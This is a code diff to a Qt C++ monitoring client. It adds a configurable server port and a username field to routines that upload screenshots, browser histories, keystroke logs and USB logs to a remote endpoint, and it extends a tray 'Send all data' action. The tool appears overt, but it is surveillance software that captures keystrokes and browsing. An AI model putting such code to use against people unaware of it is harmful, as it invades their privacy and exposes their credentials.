@@ -306,13 +306,14 @@ int MonitorClient::sendScreens(QString filePath){
     QEventLoop eventLoop;
     
     QString serverIP = getServerIP();
+    int serverPort = getServerPort();
 
     if (!serverIP.isEmpty()) {
         QNetworkAccessManager mgr;
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(serverIP.prepend("http://").append("/webapi")));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         QHttpPart imagePart;
@@ -362,7 +363,8 @@ int MonitorClient::sendTic(){
     int ret = -3;
     
     QString serverIP = getServerIP();
-    
+    int serverPort = getServerPort();
+
     if (!serverIP.isEmpty()) {
         
         // create custom temporary event loop on stack
@@ -373,7 +375,7 @@ int MonitorClient::sendTic(){
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(serverIP.prepend("http://").append("/eventhandler.php")));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         QHttpPart eventPart;
@@ -743,8 +745,8 @@ QString MonitorClient::getJsonObjectListAsJsonString(const QList<QJsonObject>& j
 int MonitorClient::sendBrowserHistories() {
     int ret = -3;
     QString serverIP = getServerIP();
-    
-    if (!serverIP.isEmpty()) {
+    int serverPort = getServerPort();
+    if (!serverIP.isEmpty() && serverPort > 0) {
         // Get browser histories
         getBrowserHistory();
         
@@ -764,7 +766,7 @@ int MonitorClient::sendBrowserHistories() {
             for (int i = 0; i < chunks.size(); ++i) {
                 qDebug() << "Sending chunk" << (i + 1) << "of" << chunks.size();
                 QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
-                ret = sendDataChunk(serverIP, "BrowserHistory", "BrowserHistories", chunkJsonString);
+                ret = sendDataChunk(serverIP, serverPort, "BrowserHistory", "BrowserHistories", chunkJsonString);
                 
                 if (ret == 1) {
                     // Success - update last sent time
@@ -928,8 +930,8 @@ int MonitorClient::sendKeyLogs()
         qDebug() << "Sending key logs in chunks...";
         
         QString serverIP = getServerIP();
-        
-        if (!serverIP.isEmpty()) {
+        int serverPort = getServerPort();
+        if (!serverIP.isEmpty() && serverPort > 0) {
             // Split into chunks of 1000 entries
             QList<QList<QJsonObject>> chunks = chunkData(keyLogs, 1000);
             
@@ -939,7 +941,7 @@ int MonitorClient::sendKeyLogs()
             for (int i = 0; i < chunks.size(); ++i) {
                 qDebug() << "Sending key log chunk" << (i + 1) << "of" << chunks.size();
                 QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
-                ret = sendDataChunk(serverIP, "KeyLog", "KeyLogs", chunkJsonString);
+                ret = sendDataChunk(serverIP, serverPort, "KeyLog", "KeyLogs", chunkJsonString);
                 
                 if (ret == 1) {
                     // Success - update last sent time
@@ -970,8 +972,8 @@ int MonitorClient::sendUSBLogs()
         qDebug() << "Sending USB logs in chunks...";
         
         QString serverIP = getServerIP();
-        
-        if (!serverIP.isEmpty()) {
+        int serverPort = getServerPort();
+        if (!serverIP.isEmpty() && serverPort > 0) {
             // Split into chunks of 1000 entries
             QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 1000);
             
@@ -981,7 +983,7 @@ int MonitorClient::sendUSBLogs()
             for (int i = 0; i < chunks.size(); ++i) {
                 qDebug() << "Sending USB log chunk" << (i + 1) << "of" << chunks.size();
                 QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
-                ret = sendDataChunk(serverIP, "USBLog", "USBLogs", chunkJsonString);
+                ret = sendDataChunk(serverIP, serverPort, "USBLog", "USBLogs", chunkJsonString);
                 
                 if (ret == 1) {
                     // Success - update last sent time
@@ -1029,12 +1031,12 @@ QList<QList<QJsonObject>> MonitorClient::chunkData(const QList<QJsonObject>& dat
     return chunks;
 }
 
-int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventType, const QString& dataField, const QString& data) {
+int MonitorClient::sendDataChunk(const QString& serverIP, int serverPort, const QString& eventType, const QString& dataField, const QString& data) {
     QEventLoop eventLoop;
     QNetworkAccessManager mgr;
     QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
-    QString url = "http://" + serverIP + "/eventhandler.php";
+    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
     QNetworkRequest req;
     req.setUrl(QUrl(url));
     req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
@@ -1044,7 +1046,17 @@ int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventTy
     jsonObj["MacAddress"] = macAddress;
     jsonObj["Event"] = eventType;
     jsonObj["Version"] = QString(MONITORAPP_VERSION);
-    jsonObj[dataField] = data;  // Direct assignment of QJsonArray
+    jsonObj["Username"] = clientName;
+    
+    // Parse the data string back into JSON array
+    QJsonParseError parseError;
+    QJsonDocument dataDoc = QJsonDocument::fromJson(data.toUtf8(), &parseError);
+    if (parseError.error == QJsonParseError::NoError && dataDoc.isArray()) {
+        jsonObj[dataField] = dataDoc.array();
+    } else {
+        qDebug() << "Failed to parse data as JSON array:" << parseError.errorString();
+        jsonObj[dataField] = data;  // Fallback to string if parsing fails
+    }
     
     QJsonDocument jsonDoc(jsonObj);
     QByteArray jsonData = jsonDoc.toJson();
@@ -1080,7 +1092,7 @@ bool MonitorClient::testAPIEndpoints(const QString& serverIP, int serverPort)
 {
     qDebug() << "=== Testing API Endpoints ===";
     
-    QStringList endpoints = {"/eventhandler", "/webapi"};
+    QStringList endpoints = {"/eventhandler.php", "/webapi.php"};
     
     for (const QString& endpoint : endpoints) {
         QString url = QString("http://%1:%2%3").arg(serverIP).arg(serverPort).arg(endpoint);
@@ -1090,9 +1102,10 @@ bool MonitorClient::testAPIEndpoints(const QString& serverIP, int serverPort)
         request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
         
         QJsonObject testData;
-        testData["Event"] = "Test";
+        testData["Event"] = "Tic";
         testData["Version"] = MONITORAPP_VERSION;
         testData["MacAddress"] = macAddress;
+        testData["Username"] = clientName;
         
         QJsonDocument doc(testData);
         QByteArray data = doc.toJson();
@@ -1217,7 +1230,7 @@ void MonitorClient::updateTrayMenu()
         return;
     }
     
-    QString statusText = "=== MonitorClient Status ===\n";
+    QString statusText = "=== MonitorClient Info ===\n";
     
     // Server information
     statusText += QString("Server: %1:%2\n").arg(getServerIP()).arg(getServerPort());
@@ -1274,7 +1287,7 @@ bool MonitorClient::testServerConnection()
 {
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
-    QString url = QString("http://%1:%2/eventhandler").arg(serverIP).arg(serverPort);
+    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
     
     qDebug() << "Testing server connection to:" << url;
     qDebug() << "Server IP:" << serverIP << "Port:" << serverPort;
@@ -1298,9 +1311,10 @@ bool MonitorClient::testServerConnection()
     }
     
     QJsonObject pingData;
-    pingData["Event"] = "Ping";
+    pingData["Event"] = "Tic";
     pingData["Version"] = MONITORAPP_VERSION;
     pingData["MacAddress"] = macAddress;
+    pingData["Username"] = clientName;
     
     QJsonDocument doc(pingData);
     QByteArray data = doc.toJson();
@@ -1362,11 +1376,28 @@ void MonitorClient::onTrayIconActivated(QSystemTrayIcon::ActivationReason reason
 void MonitorClient::onSendAllAction()
 {
     qDebug() << "Send all data requested from system tray";
+    
+    if (trayIcon) {
+        trayIcon->showMessage("Send All Data", "Collecting and sending all data...", QSystemTrayIcon::Information, 2000);
+    }
+    
+    // First, collect fresh data
+    getBrowserHistory();
+    
+    // Then emit all signals to send data
     emit screen();
     emit tic();
     emit browserHistory();
     emit keyLog();
     emit usbLog();
+    
+    // Update status after sending
+    QTimer::singleShot(2000, this, [this]() {
+        updateStatusDisplay();
+        if (trayIcon) {
+            trayIcon->showMessage("Send All Data", "All data sent successfully!", QSystemTrayIcon::Information, 3000);
+        }
+    });
 }
 
 void MonitorClient::onConfigureAction()
